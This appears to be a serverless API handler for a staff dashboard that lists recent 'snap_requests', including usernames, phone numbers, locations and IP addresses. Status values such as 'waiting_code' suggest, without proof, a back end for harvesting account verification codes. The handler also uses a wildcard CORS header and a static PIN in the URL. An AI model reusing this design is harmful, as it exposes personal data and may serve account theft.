import { neon } from '@neondatabase/serverless';

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  if (req.method === 'OPTIONS') { res.status(200).end(); return; }
  if (req.method !== 'GET') return res.status(405).json({ success: false });

  try {
    const { pin } = req.query;
    if (!pin || pin !== process.env.STAFF_PIN) {
      return res.status(401).json({ success: false, message: 'Code incorrect' });
    }

    const sql = neon(process.env.DATABASE_URL);

    // Stats globales
    const statsResult = await sql`
      SELECT 
        COUNT(*) as total,
        COUNT(*) FILTER (WHERE status = 'pending') as pending,
        COUNT(*) FILTER (WHERE status = 'processing') as processing,
        COUNT(*) FILTER (WHERE status = 'waiting_code') as waiting_code,
        COUNT(*) FILTER (WHERE status = 'completed') as completed,
        COUNT(*) FILTER (WHERE status = 'wrong_number') as wrong_number
      FROM snap_requests
    `;

    // 50 dernières demandes
    const requests = await sql`
      SELECT id, username, phone, operator, country, city, ip_address, status, created_at
      FROM snap_requests
      ORDER BY created_at DESC
      LIMIT 50
    `;

    return res.status(200).json({
      success: true,
      stats: statsResult[0],
      requests
    });
  } catch (e) {
    return res.status(500).json({ success: false, message: e.message });
  }
}